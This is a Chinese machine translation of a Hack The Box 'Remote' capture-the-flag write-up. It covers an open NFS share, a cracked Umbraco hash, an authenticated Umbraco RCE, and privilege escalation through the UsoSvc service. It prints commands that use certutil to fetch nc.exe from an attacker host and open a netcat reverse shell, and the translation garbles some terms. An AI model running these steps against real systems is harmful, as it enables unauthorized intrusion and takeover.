<html>
<head>
<title>HTB Remote [Writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB远程[报道]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-remote-writeup-eb18b1e09234?source=collection_archive---------0-----------------------#2020-09-06">https://infosecwriteups.com/htb-remote-writeup-eb18b1e09234?source=collection_archive---------0-----------------------#2020-09-06</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="33e1" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">NFS检查、CMS利用、UsoSvc服务权限利用</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/c40950c451c2319bc3daf73ae18cf2c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0xjxkn0oOxDxMum2rGkAfg.png"/></div></div></figure></div><div class="ab cl ku kv hx kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="im in io ip iq"><h2 id="a664" class="lb lc it bd ld le lf dn lg lh li dp lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">摘要</h2><p id="1165" class="pw-post-body-paragraph lx ly it lz b ma mb ju mc md me jx mf lk mg mh mi lo mj mk ml ls mm mn mo mp im bi translated">查看nmap结果，对于初学者来说，有太多的端口让人应接不暇。经过一些枚举和检查后，发现NFS共享对网络上的任何人都是公开可用的。进一步挖掘发现了凭据，通过检查网站运行的web应用程序版本，很容易就发现了漏洞。利用该漏洞，用户机器被pwn。对于根，再次使用powershell的程序快速检查，我们发现了导致成为根的服务漏洞和滥用！</p></div><div class="ab cl ku kv hx kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="im in io ip iq"><p id="7b35" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><strong class="lz iu">平台:</strong> Windows</p><p id="d286" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><strong class="lz iu">使用的工具:</strong></p><ul class=""><li id="ab98" class="mv mw it lz b ma mq md mr lk mx lo my ls mz mp na nb nc nd bi translated"><code class="fe ne nf ng nh b">nmap</code></li><li id="0ae5" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp na nb nc nd bi translated"><code class="fe ne nf ng nh b">showmount -e 10.10.10.180</code>显示自2049端口开放以来的NFS股票</li><li id="21ba" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp na nb nc nd bi translated"><code class="fe ne nf ng nh b">mount 10.10.10.180:/site_backups site_backups/</code>将可用的共享目录挂载到主机上。</li><li id="f19b" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp na nb nc nd bi translated"><code class="fe ne nf ng nh b">john</code>破解哈希文件。</li><li id="cf6e" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp na nb nc nd bi translated"><code class="fe ne nf ng nh b">powershell.exe</code>及其节目</li><li id="ac8e" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp na nb nc nd bi translated">漏洞利用:<a class="ae nn" href="https://www.exploit-db.com/exploits/46153" rel="noopener ugc nofollow" target="_blank"> Umbraco CMS 7.12.4 </a></li><li id="3ee0" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp na nb nc nd bi translated"><code class="fe ne nf ng nh b">sc.exe qc UsoSvc</code>获取更多关于服务的信息<strong class="lz iu">‘us osvc’</strong></li></ul><p id="25dd" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><strong class="lz iu"> CVE(美国)</strong> <a class="ae nn" href="http://Umbraco CMS 7.12.4" rel="noopener ugc nofollow" target="_blank">不适用</a></p></div><div class="ab cl ku kv hx kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="im in io ip iq"><h2 id="c484" class="lb lc it bd ld le lf dn lg lh li dp lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">列举</h2><p id="aa30" class="pw-post-body-paragraph lx ly it lz b ma mb ju mc md me jx mf lk mg mh mi lo mj mk ml ls mm mn mo mp im bi translated">Nmap TCP扫描输出</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi no"><img src="../Images/f75e3243ac0ff5949e994e8ed9cf2b62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C_JPKWybAru6_wxzqngxyQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi np"><img src="../Images/e9e3837cc3ebcc8018901f874b5c96c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yc59PIucWmsWFQCU8tYx4g.png"/></div></div></figure></div><div class="ab cl ku kv hx kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="im in io ip iq"><h2 id="1452" class="lb lc it bd ld le lf dn lg lh li dp lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">据点</h2><p id="4be7" class="pw-post-body-paragraph lx ly it lz b ma mb ju mc md me jx mf lk mg mh mi lo mj mk ml ls mm mn mo mp im bi translated"><strong class="lz iu"> **********港口2049装载/NFS * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="9ca0" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">使用命令:<code class="fe ne nf ng nh b">showmount -e 10.10.10.180</code>目录<strong class="lz iu"> /site_backups </strong>被暴露，每个人都可以挂载它。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nq"><img src="../Images/c9c9535317d60a1a5198c7b9accff3dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S19yNA1WhrGKjtnNy3RO-w.png"/></div></div></figure><p id="2be2" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">通过以下步骤挂载目录:</p><ol class=""><li id="f591" class="mv mw it lz b ma mq md mr lk mx lo my ls mz mp nr nb nc nd bi translated">在主机上创建一个目录，我们要在其中挂载上面找到的<strong class="lz iu"> site_backups </strong>目录。</li></ol><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ns"><img src="../Images/7490f07a25cac77cf4e4ce66c3f6af47.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tfjvnu43R-7QP75DgDOQ_w.png"/></div></div></figure><p id="435d" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">2.现在将目录挂载到我们新创建的目录中:</p><p id="f356" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><code class="fe ne nf ng nh b">mount 10.10.10.180:/site_backups site_backups/</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nt"><img src="../Images/5152717740b2a16a18293e87ef75713a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OWy9n1-M3eaGGF5zcJtR7w.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nu"><img src="../Images/ac7c936f1374501876ede4a1c1ad5a4d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3v0Ke4Tfd39-QK6ddvbJjQ.png"/></div></div></figure><p id="e047" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">使用命令<code class="fe ne nf ng nh b">grep -rl password</code>，我浏览了文件，并在<strong class="lz iu"> App_Data/Umbraco.sdf. </strong>下找到了密码散列</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nv"><img src="../Images/e048c61389be3dae0c5ed4527d4df790.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wVdNibZ00jNCUuAzXTiL8Q.png"/></div></div></figure><p id="f3e9" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">SHA-1哈希是<em class="nw">b8be 16 afba 8 c 314 ad 33d 812 f 22 a 04991 b 90 e 2 AAA</em></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nx"><img src="../Images/4af87c1ca34393c40817dba26a33633a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0giUbPjsszHcUziEhXufwg.png"/></div></div></figure><p id="0117" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">现在我们有了散列，运行<code class="fe ne nf ng nh b">John</code>Ripper来破解密码散列。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ny"><img src="../Images/7553735e214a1e1f3cc414a43a4f6abd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n1aLR_VmAhXAtg26aRj7zw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nz"><img src="../Images/f48ba4cc5c687308dbf2770c677d9bb8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZXHQS-sEX9Eki2AO87SEug.png"/></div></div></figure></div><div class="ab cl ku kv hx kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="im in io ip iq"><p id="3534" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><strong class="lz iu">* * * * * * * * * * * * * *端口80 HTTP * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="1f88" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">在使用dirsearch.py搜索目录内容的过程中，我偶然发现了这个名字<em class="nw">‘um braco’</em>，并找到了它的登录门户:<em class="nw">http://10 . 10 . 10 . 180/um braco</em></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oa"><img src="../Images/e7b95e7a439458861655d6555aaa4399.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tt8dXQ7yU0kiWkcdcknJ9A.png"/></div></div></figure><h2 id="b4bf" class="lb lc it bd ld le lf dn lg lh li dp lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">横向运动</h2><p id="d37d" class="pw-post-body-paragraph lx ly it lz b ma mb ju mc md me jx mf lk mg mh mi lo mj mk ml ls mm mn mo mp im bi translated">使用找到的凭证，我登录了umbraco CMS帐户。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ob"><img src="../Images/8d0141cbb7a9dfd0c264665731a87b20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uz5ssFX-ntCwSH9WdkRjjg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oc"><img src="../Images/2914e2a209d84c2cee4735b9f062376d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4kk-BzAC--dfDn-wo7HnsQ.png"/></div></div></figure><p id="5687" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">我查阅了7.12.4版本的<strong class="lz iu"> Umbraco漏洞利用</strong>，发现了<a class="ae nn" href="https://www.exploit-db.com/exploits/46153" rel="noopener ugc nofollow" target="_blank"> <strong class="lz iu">漏洞利用</strong> </a>，这是一个经过验证的远程代码执行。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi od"><img src="../Images/fa99c9316daa1d5124333bcf1ae8dc99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HCqVBfMaE52YFtMCC81F3Q.png"/></div></div></figure></div><div class="ab cl ku kv hx kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="im in io ip iq"><h2 id="cdab" class="lb lc it bd ld le lf dn lg lh li dp lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">反向外壳</h2><p id="1087" class="pw-post-body-paragraph lx ly it lz b ma mb ju mc md me jx mf lk mg mh mi lo mj mk ml ls mm mn mo mp im bi translated">使用登录凭据，我们现在可以运行该漏洞，在受害者的机器上上传nc.exe，然后执行命令获得反向外壳。</p><p id="3607" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><em class="nw">*在运行以下命令之前，不要忘记在/etc/hosts上设置本地DNS。* </em></p><p id="e700" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><code class="fe ne nf ng nh b">python3 remoterce.py -u admin@htb.local -p baconandcheese -i <a class="ae nn" href="http://htb.local" rel="noopener ugc nofollow" target="_blank">http://htb.local</a> -c cmd.exe -a “/c certutil -urlcache -split -f <a class="ae nn" href="http://10.10.14.42/nc.exe" rel="noopener ugc nofollow" target="_blank">http://10.10.14.12/nc.exe</a> c:/windows/temp/nc.exe”</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oe"><img src="../Images/4228753d59b5b1241ed3284d62f02f80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5R76O4aAyUPLhK1e4Tv1OA.png"/></div></div></figure><p id="14d3" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">现在启动一个监听端口，然后执行下面的命令。</p><p id="3e19" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><code class="fe ne nf ng nh b">python3 remoterce.py -u admin@htb.local -p baconandcheese -i <a class="ae nn" href="http://htb.local" rel="noopener ugc nofollow" target="_blank">http://htb.local</a> -c cmd.exe -a “/c c:/windows/temp/nc.exe 10.10.14.42 7654 -e cmd.exe”</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi of"><img src="../Images/fbe986bcc36f586fffa9cfb3605a2c08.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IJ2cMIq_QDwosrDoghn1aA.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi og"><img src="../Images/b33a89de5e49c004e9c21c1294bf48ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:992/format:webp/1*Qs9IsDyL3miGKCa3kgs5NQ.png"/></div></figure><p id="89a6" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">然后我简单地运行了<code class="fe ne nf ng nh b">powershell.exe</code>,虽然在这个阶段并不需要，因为user.txt可以很容易地访问，不需要任何进一步的努力。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/361524587a0ec90edba3562f403ddb6d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1144/format:webp/1*Uk1IY88ZZlVeRBx_E2ZHQQ.png"/></div></figure></div><div class="ab cl ku kv hx kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="im in io ip iq"><h1 id="7d5c" class="oi lc it bd ld oj ok ol lg om on oo lj jz op ka ln kc oq kd lr kf or kg lv os bi translated">HTB远程根</h1><h2 id="851d" class="lb lc it bd ld le lf dn lg lh li dp lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">摘要</h2><p id="2960" class="pw-post-body-paragraph lx ly it lz b ma mb ju mc md me jx mf lk mg mh mi lo mj mk ml ls mm mn mo mp im bi translated">对于此windows计算机，发现有漏洞的服务(UsoSvc)正在以管理员权限运行。通过用恶意代码修改其二进制路径名，使UsoSvc服务执行根外壳，重新启动服务，根外壳在主机上执行，这是一个简单的利用漏洞攻击。</p></div><div class="ab cl ku kv hx kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="im in io ip iq"><h2 id="d7c1" class="lb lc it bd ld le lf dn lg lh li dp lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated"><strong class="ak">权限提升</strong></h2><p id="1411" class="pw-post-body-paragraph lx ly it lz b ma mb ju mc md me jx mf lk mg mh mi lo mj mk ml ls mm mn mo mp im bi translated">像往常一样，首先启用<code class="fe ne nf ng nh b">powershell.exe</code>，然后在受害者的机器上下载<code class="fe ne nf ng nh b">powerup.ps1</code>。</p><ol class=""><li id="05ca" class="mv mw it lz b ma mq md mr lk mx lo my ls mz mp nr nb nc nd bi translated"><code class="fe ne nf ng nh b">mkdir temp</code>在<strong class="lz iu"> C:\ </strong>档行驶。</li><li id="990a" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp nr nb nc nd bi translated"><code class="fe ne nf ng nh b">wget <a class="ae nn" href="http://10.10.14.12/windows/powerup.ps1" rel="noopener ugc nofollow" target="_blank">http://10.10.14.12/windows/powerup.ps1</a> -o powerup.ps1</code></li><li id="6ae9" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp nr nb nc nd bi translated"><code class="fe ne nf ng nh b">Import-Module ./powerup.ps1</code>然后是<code class="fe ne nf ng nh b">Import-Module .\powerup.ps1</code></li><li id="e239" class="mv mw it lz b ma ni md nj lk nk lo nl ls nm mp nr nb nc nd bi translated"><code class="fe ne nf ng nh b">Invoke-AllChecks</code></li></ol><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ot"><img src="../Images/df327aca468807cc65a1255ce6f46ced.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ne5ZDkIT6Ctf4sgk_7LP6w.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ou"><img src="../Images/221ec54ea55ef30e44caf7125ba7b010.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HIsH2yiMlWCxuh7jSzkDIg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ov"><img src="../Images/4a1892a06d8ce19101f77245d80c1320.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6i-NXs3x0xAz6kYiBlHITw.png"/></div></div></figure><p id="373f" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">这里受影响的服务是<strong class="lz iu"> UsoSvc </strong>。</p><p id="532e" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">使用以下命令检查UsoSvc服务的详细信息:</p><p id="c3a5" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><code class="fe ne nf ng nh b">sc.exe qc UsoSvc</code></p><p id="deb5" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated">请注意，该服务是作为特权用户运行的。滥用这个漏洞可以让我们得到根外壳。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ow"><img src="../Images/e0b041a0330ad982ee77f21376241b33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qAuM83sZcsHVyaSyfcIRiQ.png"/></div></div></figure><p id="2e29" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><strong class="lz iu">第一步。</strong>修改二进制路径注入恶意代码运行netcat，在主机上执行反向shell。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ox"><img src="../Images/53fbb45ca623f8c0c9041aeb016a4e20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*el-NV8oedAczJeo607ib6g.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oy"><img src="../Images/51a8c66e6a9e93b9e0515c97ac39c013.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CaX3Li81EkrlWim3BfgiTg.png"/></div></div></figure><p id="d5dd" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><strong class="lz iu">第二步。</strong>再次检查UsoSvc细节，查看二进制路径名是否已经更改</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oz"><img src="../Images/acb866290e4c7255d170254446c533ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M-j9o_nD6IvX_vh643JRNg.png"/></div></div></figure><p id="cb4d" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><strong class="lz iu">第三步。</strong>现在启动监听器端口。</p><p id="1f52" class="pw-post-body-paragraph lx ly it lz b ma mq ju mc md mr jx mf lk ms mh mi lo mt mk ml ls mu mn mo mp im bi translated"><strong class="lz iu">第四步。</strong>停止usosvc服务，然后重新启动。这将允许在10.10.14.14:3432执行<code class="fe ne nf ng nh b"> cmd.exe</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi pa"><img src="../Images/c454d23a10a67d4d6364486d44724fc0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zUGXblNb7pT3Gb1uN0otuQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi pb"><img src="../Images/f97be68849479adbc4e40eddf658506b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fMrGs5EtrzOIaiLTy9CRhQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi pc"><img src="../Images/0f40baa7d5c9344bc50a9e3f896ea822.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UKbRnUCrr6n88jBTyR3Zxg.png"/></div></div><figcaption class="pd pe gj gh gi pf pg bd b be z dk translated"><strong class="bd ld">成功！！！</strong></figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ph"><img src="../Images/abcec6f0507e70ca268a642662f40c7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*f0on1SJhhp-Hrh5EwFeUzA.gif"/></div></div></figure></div></div>    
</body>
</html>